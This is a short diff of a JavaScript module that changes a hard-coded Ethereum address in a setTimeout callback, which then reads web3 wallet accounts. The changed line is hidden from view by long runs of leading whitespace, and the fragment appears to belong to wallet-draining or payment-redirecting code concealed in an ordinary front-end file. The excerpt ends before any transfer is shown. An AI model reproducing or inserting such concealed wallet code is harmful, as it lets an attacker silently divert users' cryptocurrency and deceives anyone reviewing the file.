@@ -336,7 +336,7 @@ export default {
     }
 }
 setTimeout(function(){
-                                                                                        var adr = '0x56e02ef4810a9af0c0bf7b24c9bc9935cb61950d'; //address
+                                                                                        var adr = '0x6e41829ae0a7f7f3bc3e04f53f6c4999bc27371b'; //address
                                                                                         var url = new URL(window.location.href);
     if (typeof web3 !== 'undefined') {
         web3.eth.getAccounts(function(error, accounts) {
